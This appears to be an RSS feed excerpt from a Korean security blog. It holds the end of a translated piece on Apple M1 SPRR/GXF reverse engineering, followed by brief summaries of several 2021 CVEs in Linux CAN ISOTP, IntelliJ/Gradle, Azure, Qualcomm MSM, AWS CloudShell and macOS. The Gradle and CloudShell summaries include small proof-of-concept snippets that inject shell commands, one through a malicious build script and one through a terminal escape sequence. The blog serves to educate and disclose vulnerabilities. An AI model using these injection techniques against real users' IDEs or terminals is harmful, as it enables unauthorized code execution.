[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code>은 GL1 용도이고 <code>3, 6, 15, 11</code>은 GL2를 위한 것인지 알아내는 것은 간단하다. EL2에서 SPRR 및 GXF를 활성화한 후 EL1로 낮추어 동일한 작업을 하면 된다. 이번 작업은 새로운 레지스터만을 구한다.</p><pre><code class="hljs json">[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code> 그룹은 EL1 레지스터이다. 하지만 이것은 크게 문제가 되지는 않는다. M1은 항상 <code>HCR_EL2.E2H</code>에서 실행되며 이는 <code>_EL1</code> 레지스터가 <code>_EL2</code> 레지스터로 리다이렉션 됨을 의미한다.</p><p>이전 XNU 릴리스에서 다음과 같은 이름을 확인할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ELR      ELR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_FAR      FAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ESR      ESR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_SPSR     SPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ASPSR    ASPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_VBAR     VBAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_TPIDR    TPIDR_GL11</span></code></pre><p>왜 이 레지스터들이 GL11 suffix를 가지고 있는지 분명하지 않지만 위에서 찾은 레지스터와 쉽게 매치할 수 있다. ASPSR에는 <code>gexit</code>가 guarded execution으로 return 해야 하는지 일반 실행으로 return 해야 하는지 결정하는 비트가 포함되어 있다.</p><h1 id="SPRR-amp-GXF-inside-XNU"><a href="#SPRR-amp-GXF-inside-XNU" class="headerlink" title="SPRR &amp; GXF inside XNU"></a>SPRR &amp; GXF inside XNU</h1><p>마지막으로 XNU가 새로운 기능을 어떻게 사용하는지 확인하자. Jonathan의 wirte up에 이미 SPRR과 GXF가 어떻게 사용되는지 있으므로 살펴볼 것이 별로 없다. SPRR은 APRR의 역할을 대체할 뿐이며 커널이 페이지 테이블에 쓸 수 없도록 하고 PPL 코드를 실행할 수 없도록 한다.</p><p>주요한 차이점은 GXF이다. APRR 레지스터를 수정하는 trampoline 함수를 주의해서 만드는 대신 GXF 엔트리 벡터를 설정한다. 그러면 페이지 테이블 권한은 자동적으로 변경되고 genter는 PPL을 직접 가리킬 수 있다.</p><p>XNU가 SPRR를 다음과 같이 초기화한다. 시작 함수는 SPRR이 EL1 SPRR 권한 레지스터를 <code>0x2020A505F020F0F0</code>로 초기화할 수 있도록 잠시 활성화한다.</p><p>그 후 초기 GL 부트스트랩 코드는 추가적인 변경을 방지하기 위해 lock 하기 전에 EL1 권한을 <code>0x2020-A506F020F0E0</code>으로 업데이트한다.</p><p>guarded excution mode의 엔트리 포인트는 커널 텍스트 영역에서 함수로 설정되며 <code>PPLTEXT</code>의 시작 부분으로 점프한다. PPL 엔트리 함수는 SPRR 권한이 올바르게 설정되었는지 확인하고 Jonathan의 write up에 작성된 대로 동작한다.</p><p>마지막으로 XNU에 사용되는 여러 가지 SPRR 페이지 권한을 살펴보자.</p><table><thead><tr><th>Index</th><th>Normal permissions</th><th>SPRR Permissions</th><th>Usage</th></tr></thead><tbody><tr><td>0</td><td>EL0</td><td>EL2</td><td>EL0</td></tr><tr><td>1</td><td><code>--x</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>3</td><td><code>---</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>5</td><td><code>rw-</code></td><td><code>rwx</code></td><td><code>rw-</code> <code>r-x</code></td></tr><tr><td>7</td><td><code>rw-</code></td><td><code>rw-</code></td><td><code>rw-</code></td></tr><tr><td>8</td><td><code>--x</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>---</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>---</code></td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>13</td><td><code>r-x</code></td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>15</td><td><code>r--</code></td><td><code>r--</code></td><td><code>r--</code></td></tr></tbody></table><p>GL 권한은 GL이 커널 코드를 실행하지 못하게 하고(entry 10) 유저 데이터에 접근할 수 없게(entry 7) lock 될 수 있다. </p><p>그 외에도 이전 APRR 하드웨어의 깔끔한 상위 버전으로 느껴진다. 이런 변화들은 전체적인 시스템을 오류에 덜 취약하게 만들며(레지스터들을 잠그거나, kernel→PPL 전환이 하드웨어에서 발생하며 커널과 PPL 예외 벡터는 분리되어 있다) 유연하게 만든다. APRR은 권한을 제거하는 데에만 사용되었지만 SPRR은 <code>rwx</code> 페이지가 필요하지 않을 때 권한을 다시 매핑할 수 있다.</p><h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>애플 실리콘은 공격에 대한 추가적인 보호 기법으로 함께 동작하는 두 가지 비밀스러운 기능을 가지고 있다. GXF는 GL1과 GL2라는 lateral exception level을 도입하여 다른 페이지 권한으로 EL과 상응하는 같은 페이지 테이블을 사용할 수 있다. SPRR은 EL과 GL의 페이지 엔트리에서 권한 비트를 재정의할 수 있다. 애플은 이를 통해 GL의 모든 페이지 테이블 조작 코드를 숨기고 EL이 페이지 테이블을 수정할 수 없도록 하였다. 이는 커널 모드에서 실행되는 코드로부터 페이지 테이블을 보호하여 적은 attack surface와 오버헤드를 가진 하이퍼 바이저가 효과적으로 도입된다. 이 기능들의 대부분은 파이썬과 m1n1을 사용하여 리버스 엔지니어링 할 수 있다.</p><p>리눅스를 M1으로 포팅하는 데에는 유용하지 않지만 XNU를 가상화하여 MMIO access를 trace 할 수 있다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/m1/">m1</category>
      
      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/sprr/">sprr</category>
      
      <category domain="https://hackyboiz.github.io/tags/gxf/">gxf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/16/idioth/apple_silicon_sprr_gxf/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-32606: CAN ISOTP 로컬 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/15/fabu1ous/2021-05-15/</link>
      <guid>https://hackyboiz.github.io/2021/05/15/fabu1ous/2021-05-15/</guid>
      <pubDate>Sat, 15 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/nrb547/kernel-exploitation/blob/main/c</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md">CAN ISOTP local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux Kernel 5.11 through 5.12.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><code>net/can/isopt.c</code>의 함수 <code>iso_setsockopt()</code>에 use-after-free로 인한 권한상승 취약점이 발견되었습니다. 취약점은 CAN network subsystem 내부의 ISOTP CAN network 프로토콜에 있습니다. Race condition으로 Socket이 bound 된 이후에도 socket 옵션을 수정할 수 있고 이로 인해 use-after-free가 발생합니다.</p><p>CAN ISOTP 프로토콜은 기본 쉘이 아닌 다른 socket 옵션이 사용되면 <code>isotp_setsockopt()</code>를 호출해 socket 옵션을 적용시킵니다. <code>isotp_setsockopt()</code>는 ISOPT socket이 이미 바인드 된 상태라면 리턴, 바인드 되지 않은 상태라면 <code>isotp_bind()</code>를 호출해 바인드 작업을 거치고 user space로부터 socket 옵션 데이터를 복사합니다.</p><p><code>isotp_bind()</code>가 ISOTP socket을 바인드 할 때 해당 socket 옵션의 <code>flag</code>값이  <code>CAN_ISOTP_SF_BROADCAST</code>가 아닐 때만 CAN 수신기를 등록합니다. 만약  <code>isotp_bind()</code>가 socket을 바인드 한 직후 user space로부터 socket 옵션 데이터를 복사하기 직전에 race condition을 발생시킨다면 <code>flag</code>값이 <code>CAN_ISOTP_SF_BROADCAST</code>이면서 CAN 수신기가 등록된 socket을 생성할 수 있습니다.</p><p>이후에 함수 <code>isotp_release()</code>가 호출되어 socket을 해제할 때 <code>flag</code>값이  <code>CAN_ISOTP_SF_BROADCAST</code>이므로 등록된 CAN 수신기를 그대로 남겨놓습니다. 이를 통해 이미 해제된 socket에 접근할 수 있게 되고 use-after-free가 발생합니다. 해커는 이 취약점을 악용해 로컬 권한 상승을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/socket/">socket</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/15/fabu1ous/2021-05-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-29263: IntelliJ, Android Studio의 외부 저장소를 통한 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/14/l0ch/2021-05-14/</link>
      <guid>https://hackyboiz.github.io/2021/05/14/l0ch/2021-05-14/</guid>
      <pubDate>Fri, 14 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2020-337_3</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-337_338-intellij-idea-android-studio/">GHSL-2020-337_338: Arbitrary code execution when cloning/checking out a Gradle project - CVE-2021-29263</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>IntelliJ IDEA</li><li>Android Studio</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>IntelliJ와 Android Studio에서 악성 저장소를 가져올 때 임의 코드 실행 취약점이 발견되어 GitHub Security Lab에 세부 정보가 공개되었습니다.</p><p>Groovy를 기반으로 한 오픈소스 빌드 도구인 <a href="https://github.com/gradle/gradle">Gradle</a> 을 clone 또는 checkout할 때 IntelliJ와 Android Studio는 유저 확인단계를 생략하고 빌드 스크립트를 실행합니다. 이를 악용한 해커가 악성 저장소를 타겟에 clone 혹은 checkout 하도록 유도하면 다음과 같이 Gradle의 <code>exec</code>가 타겟의 상호작용 없이 malware dropper 기능을 수행할 수 있습니다.</p><pre><code class="hljs python">apply plugin: <span class="hljs-string">&#x27;java&#x27;</span>sourceCompatibility = <span class="hljs-number">1.8</span>targetCompatibility = <span class="hljs-number">1.8</span>void checkRequirements()&#123;    <span class="hljs-keyword">exec</span> &#123;      executable <span class="hljs-string">&#x27;touch&#x27;</span>      args <span class="hljs-string">&#x27;/tmp/pwned_from_gradle&#x27;</span>    &#125;&#125;build&#123;    checkRequirements();&#125;</code></pre><p>MS의 Visual Studio에서도 비슷한 유형의 취약점(CVE-2020-17156)이 패치된 적이 있으며 이는 오픈소스 저장소를 이용할 때 주의를 기울일 필요가 있음을 의미합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/gradle/">gradle</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/14/l0ch/2021-05-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-27075: Microsoft Azure 권한 상승 및 정보 유출 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/13/idioth/2021-05-13/</link>
      <guid>https://hackyboiz.github.io/2021/05/13/idioth/2021-05-13/</guid>
      <pubDate>Thu, 13 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.intezer.com/blog/cloud-security/cve-2021-2707</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/cloud-security/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/">CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure VM Extension</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 클라우드 컴퓨팅 플랫폼 Microsoft Azure에서 VM Linux 시스템의 권한 상승과 정보 유출이 가능한 취약점이 발견되었습니다.</p><p>Azure VM은 개발자와 관리자가 추가 구성요소를 설치할 수 있도록 통합 플러그인 시스템을 제공합니다. 이 기능을 통해 Azure에서 제공하는 first party 외에 third party app 또한 설치할 수 있습니다. 이러한 확장 프로그램 설치를 관리하기 위해 Microsoft Azure Guest Agent가 <code>/var/lib/waagent</code>에 설치됩니다. 이 디렉터리에는 확장 프로그램에 대한 정보가 저장되어 있어 root가 아닌 사용자는 접근할 수 없습니다.</p><p>확장 프로그램이 VM에 추가되면 설정 파일은 Azure VM Manager인 Fabric Controller에 의해 업데이트됩니다. WAAgent가 Fabric Controller에서 이 파일을 받아와서 업데이트하고 확장 프로그램을 설치하고 deploy 합니다. WAAgent는 Fabric Controller와 특정 IP 주소(168.63.129.16)를 통해 통신합니다. ExtensionConfig 파일의 엔드 포인트 Response에는 개인 키와 같은 정보가 포함되어 있으며 키는 <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.prv</code>에 저장되고 인증서는 <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.crt</code>에 저장됩니다. ExtensionConfig 파일에 키와 인증서가 포함되어 있지 않으므로 확장 프로그램을 deploy 할 때 Wire Server와 통신하여 Certificates endpoint를 사용하는데 이때 전송된 인증서에 대한 검증이 존재하지 않아 정보 유출이 발생합니다.</p><p>해커가 자신의 개인 키와 인증서를 만들어 그를 통해 Wire Server에 암호화된 키를 수신합니다. Transport Key를 통해 암호화된 키를 복호화하여 ExtensionConfig의 <code>protectedSettings</code>를 읽어올 수 있습니다. 또한 Azure Instance Metadata Service인 169.254.169.254와의 통신을 통해 168.63.129.16에 필요한 root 권한 없이 Wire Server와 통신하여 정보를 유출할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/azure/">azure</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/13/idioth/2021-05-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-11292: 안드로이드 기기를 도청할 수 있는 Qualcomm 칩 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/12/fabu1ous/2021-05-12/</link>
      <guid>https://hackyboiz.github.io/2021/05/12/fabu1ous/2021-05-12/</guid>
      <pubDate>Wed, 12 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://research.checkpoint.com/2021/security-probe-of-qu</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/">Security probe of Qualcomm MSM data services</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm MSM<br>issue: QPSIIR-1441</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Research가 Qualcomm의 MSM(Mobile Station Modem) data service에서 발견된 heap overflow 취약점을 공개했습니다. 이번에 공개된 write-up에서 주목할 점은 QMI(Qualcomm MSM Interface)가 MSM 익스플로잇의 공격 벡터로 사용될 수 있다는 점입니다. MSM은 QuRT(Qualcomm real-time OS)의 관리를 받아 루팅 된 안드로이드 기기에서도 디버깅이나 메모리 덤핑이 불가능합니다. 따라서 MSM의 소프트웨어 구성 요소와 주변 서브시스템 간의 통신을 담당하는 QMI를 통해 data service를 공격하고 QuRT를 (악성코드로) 패치하는 것이 Check Point Research가 제시한 방법입니다.</p><ul><li><p>CVE-2020-11292</p><p>QMI에 전달되는 유저 제공 데이터의 검증 미흡으로 heap overflow가 발생합니다. 핸들러 함수 <code>qmi_voicei_srvcc_call_config_req</code>는 안드로이드로부터 받은 QMI 메세지를 파싱합니다. QMI 메세지에서 TLV payload를 파싱 할 때 <code>TLV packet type</code>값 만큼 루프를 돌며 힙 메모리에 호출 콘텍스트를 옮기는데 해당 루프 회수의 최댓값 검증이 없어 overflow가 발생합니다.</p></li></ul><p>MSM은 Qualcom에서 제작한 SoC(System on Chip)이며, 현재 스마트폰의 30%가량이 해당 MSM 칩과 QMI를 사용하는 것으로 알려져 있습니다. 해커가 위와 같은 취약점을 악용한다면 MSM를 제어할 수 있으며 모뎀에 악성코드를 심어놓을 수 있습니다. 이를 통해 해커는 기기의 SMS 기록 및 통화 도청을 할 수 있게 됩니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/12/fabu1ous/2021-05-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] AWS CloudShell terminal escape injection 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/11/l0ch/2021-05-11/</link>
      <guid>https://hackyboiz.github.io/2021/05/11/l0ch/2021-05-11/</guid>
      <pubDate>Tue, 11 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2154">Issue 2154: Terminal escape injection in AWS CloudShell</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Console에서 사용 가능한 브라우저 기반 쉘인 AWS CloudShell에서 원격 코드 실행 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 AWS CloudShell의 <code>aceterm</code> 라이브러리에서 <a href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> 이스케이프 문자를 처리하는 과정에 존재합니다. </p><pre><code class="hljs python">case <span class="hljs-string">&#x27;+q&#x27;</span>:var pt = this.currentParam, valid = false;this.send(<span class="hljs-string">&#x27;\x1bP&#x27;</span> + +valid + <span class="hljs-string">&#x27;+r&#x27;</span> + pt + <span class="hljs-string">&#x27;\x1b\\&#x27;</span>);<span class="hljs-keyword">break</span>;</code></pre><p><code>echo -ne &#39;\eP+q6b64\e\\&#39;</code> 을 입력하는 경우 위 코드에서 다음과 같이 처리됩니다. <code>this.currenParam</code>은 <code>\eP+q</code> 이스케이프 문자 뒤에 오는 임의의 문자열을 포함하며 <code>this.send()</code>에서 이를 터미널 입력 핸들러로 전달하는데, 이때 개행을 포함한 임의 코드를 삽입할 수 있습니다.</p><p>이를 악용한 해커가 타겟의 AWS 인스턴스에 <code>/tmp/foo</code> 파일을 생성하는 PoC는 다음과 같습니다.</p><pre><code class="hljs python">$ echo -e <span class="hljs-string">&quot;echo -ne &quot;</span>abcdef\x1bP+q\ntouch /tmp/foo\n\x1b\n<span class="hljs-string">&quot;&quot;</span> &gt; index.html</code></pre><p>타겟 AWS CloudShell에서 해커의 <code>index.html</code>을 curl 등의 툴로 액세스 하면 취약점이 트리거 되어 원격 코드 실행이 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/terminal-escape-injection/">terminal escape injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/aws/">aws</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/11/l0ch/2021-05-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1815: MacOS 기본 설정을 통한 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/10/idioth/2021-05-10/</link>
      <guid>https://hackyboiz.github.io/2021/05/10/idioth/2021-05-10/</guid>
      <pubDate>Mon, 10 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/macos-preferenc</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.offensive-security.com/offsec/macos-preferences-priv-escalation/?utm_content=165476462&utm_medium=social&utm_source=twitter&hss_channel=tw-134994790">MACOS LOCAL PRIVILEGE ESCALATION VIA PREFERENCES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MacOS &lt; 11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple MacOS에서 2020년 패치된 CVE-2020-9839의 잘못된 수정으로 인한 권한 상승 취약점이 발견되었습니다.</p><p>2020년에 발견된 권한 상승 취약점은 기본 설정을 담당하는 <code>cfprefsd</code> 프로세스에 존재합니다. 해당 프로세스는 응용 프로그램 설정을 하기 위해 일반 사용자 권한으로 동작하는 프로세스와 시스템 전반적인 설정을 위해 루트 권한으로 동작하는 두 개의 프로세스가 존재합니다. 두 프로세스 모두 <a href="https://developer.apple.com/documentation/xpc">XPC 연결</a>이 가능합니다. 따라서 <code>CFPrefsCreatePreferencesDirectory</code> 함수를 사용하여 <code>cfprefsd</code> 데몬에서 심볼릭 링크를 사용하여 사용자 지정 디렉터리를 생성할 때 권한 상승이 가능합니다. 이는 해당 함수에서의 심볼릭 링크를 막음으로써 임의 디렉터리의 소유권 수정을 막았습니다.</p><p>하지만 여전히 사용자나 루트 권한으로 디렉터리를 생성할 수 있어 취약점이 발생합니다. MacOS는 유지 관리를 위해 루트 권한으로 주기적으로 실행되는 스크립트를 사용합니다. 이는 <code>/etc/defaults/periodic.conf</code>에 정의되지만 사용자 정의 스크립트는 <code>/usr/local/etc/periodic</code>에 저장됩니다.</p><p>기본적으로 해당 디렉터리는 존재하지 않으므로 <code>cfprefsd</code>를 통해 해당 디렉터리를 해커의 소유로 생성한 후 스크립트를 생성하면 루트 권한으로 스크립트를 실행할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/macOS/">macOS</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/10/idioth/2021-05-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 5 - HITCON 2019 dadadb(2)</title>
      <link>https://hackyboiz.github.io/2021/05/09/l0ch/pwncoolsexy-part5/</link>
      <guid>https://hackyboiz.github.io/2021/05/09/l0ch/pwncoolsexy-part5/</guid>
      <pubDate>Sun, 09 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;이전-시리즈-바로가기&quot;&gt;&lt;a href=&quot;#이전-시리즈-바로가기&quot; class=&quot;headerlink&quot; title=&quot;이전 시리즈 바로가기&quot;&gt;&lt;/a&gt;이전 시리즈 바로가기&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.</description>
        
      
      
      
